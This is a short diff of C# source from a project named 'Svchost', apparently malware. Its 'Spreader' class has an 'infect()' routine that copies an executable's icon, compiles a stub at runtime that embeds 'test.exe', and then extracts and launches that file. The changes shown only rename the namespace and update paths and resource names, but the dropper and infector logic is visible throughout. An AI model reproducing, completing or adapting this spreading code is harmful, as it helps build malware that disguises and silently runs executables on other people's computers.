@@ -6,12 +6,11 @@ using System.Diagnostics;
 using System.CodeDom.Compiler;
 
 using System.Windows.Forms;
-using Svchost.Spread;
 using System.Reflection;
 using System.Drawing.IconLib;
 using Microsoft.CSharp;
 
-namespace Svchost.TextHandling
+namespace Svchost.Spread
 {
     public class Spreader
     {
@@ -159,7 +158,7 @@ namespace Svchost.TextHandling
 
         void infect()
         {
-            exctractIcon(@"D:\NeoDevMain\CPHD\Pasta\Win32\EXE\CPHD.exe");
+            exctractIcon(@"test.exe");
 
             compilerParameters.ReferencedAssemblies.Add("System.dll");
             compilerParameters.EmbeddedResources.Add("test.exe");
@@ -169,7 +168,7 @@ namespace Svchost.TextHandling
             "{" +
             "   static void Main()" +
             "   {" +
-            "       ExtractResource( \"KeyboardLayout.test.exe\", \"test.exe\" );" +
+            "       ExtractResource( \"Svchost.Spread.test.exe\", \"test.exe\" );" +
             "       System.Diagnostics.Process.Start(\"test.exe\");" +
             "   }" +
 
